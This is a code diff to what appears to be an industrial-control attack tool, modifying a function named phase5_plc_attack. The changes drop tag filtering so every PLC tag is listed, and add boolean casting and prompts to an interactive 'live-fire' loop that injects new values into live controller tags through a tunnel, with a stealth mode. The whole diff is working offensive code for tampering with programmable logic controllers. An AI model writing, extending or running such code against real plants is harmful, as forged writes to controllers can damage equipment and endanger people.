@@ -1479,23 +1479,17 @@ def phase5_plc_attack() -> PhaseResult:
                     return str(dt.get("name", "STRUCT"))
                 return str(dt)
 
-            filtered = [
-                t for t in all_tags
-                if any(kw in _tname(t).lower() for kw in INTERESTING)
-                and _ttype(t).upper() in NUMERIC_TYPES
-            ]
-            # Fall back to first 40 raw tags if nothing interesting matched
-            display_tags = filtered if filtered else all_tags[:40]
-            if not filtered:
-                warn("No interesting tags matched — showing first 40 raw tags")
+            # No filtering — expose every tag for full manual control
+            display_tags = all_tags
+            ok(f"{len(display_tags)} tags loaded — all tags shown for manual inspection")
 
             def _render_tag_table():
                 tbl = Table(
-                    title="[bold magenta]PLC Tags — Filtered[/bold magenta]",
+                    title="[bold magenta]PLC Data Table — All Tags[/bold magenta]",
                     show_header=True, header_style="bold cyan", border_style="dim",
                 )
-                tbl.add_column("#",         style="dim",    width=4)
-                tbl.add_column("Tag Name",  style="green",  width=38)
+                tbl.add_column("#",         style="dim",    width=5,  justify="right")
+                tbl.add_column("Tag Name",  style="green",  width=42)
                 tbl.add_column("Data Type", style="yellow", width=12)
                 for i, t in enumerate(display_tags, 1):
                     tbl.add_row(str(i), _tname(t), _ttype(t))
@@ -1504,8 +1498,11 @@ def phase5_plc_attack() -> PhaseResult:
             # ── Live-fire shell — tunnel + connection stay open throughout ─────
             payloads_fired: list[str] = []
 
-            def _cast(raw: str, reference):
-                """Cast raw string to the same type as reference value."""
+            def _cast(raw: str, reference, dtype: str = ""):
+                """Cast raw string to the correct type for the selected tag."""
+                # BOOL tag — accept True/False/1/0/yes/no
+                if dtype.upper() == "BOOL" or isinstance(reference, bool):
+                    return raw.strip().lower() in ("true", "1", "yes", "on")
                 try:
                     if isinstance(reference, float): return float(raw)
                     if isinstance(reference, int):   return int(raw)
@@ -1593,12 +1590,15 @@ def phase5_plc_attack() -> PhaseResult:
                     idx = int(raw_idx) - 1
                     if not (0 <= idx < len(display_tags)):
                         raise ValueError
-                    tag = _tname(display_tags[idx])
+                    selected_tag_obj = display_tags[idx]
+                    tag   = _tname(selected_tag_obj)
+                    dtype = _ttype(selected_tag_obj)
                 except ValueError:
                     warn("Invalid selection — enter a number from the table or 'q' to quit")
                     continue
 
                 CFG["plc"]["tag"] = tag
+                is_bool = dtype.upper() == "BOOL"
 
                 # ── INNER LOOP: continuous injection on same tag ──────────────
                 while not quit_all:
@@ -1611,9 +1611,15 @@ def phase5_plc_attack() -> PhaseResult:
                         f"[dim]  [bold]back[/bold] / [bold]b[/bold] = change tag  |  "
                         f"[bold]q[/bold] = quit[/dim]"
                     )
+
+                    if is_bool:
+                        prompt_hint = "[dim](BOOL — enter [bold]true[/bold]/[bold]false[/bold] or [bold]1[/bold]/[bold]0[/bold])[/dim]"
+                    else:
+                        prompt_hint = f"[dim](current: [bold yellow]{cur_val}[/bold yellow])[/dim]"
+
                     raw_val = Prompt.ask(
-                        f"[red]  {tag}[/red] "
-                        f"[dim](current: [bold yellow]{cur_val}[/bold yellow])[/dim] "
+                        f"[red]  {tag}[/red] [{dtype}] "
+                        f"{prompt_hint} "
                         f"[red]→ new value[/red]"
                     ).strip().lower()
 
@@ -1626,7 +1632,7 @@ def phase5_plc_attack() -> PhaseResult:
                         _stop_stealth()
                         break   # return to outer loop (re-prompts stealth mode)
 
-                    inject_val = _cast(raw_val, cur_val)
+                    inject_val = _cast(raw_val, cur_val, dtype)
 
                     with plc_lock:
                         before = plc_conn.read(tag)
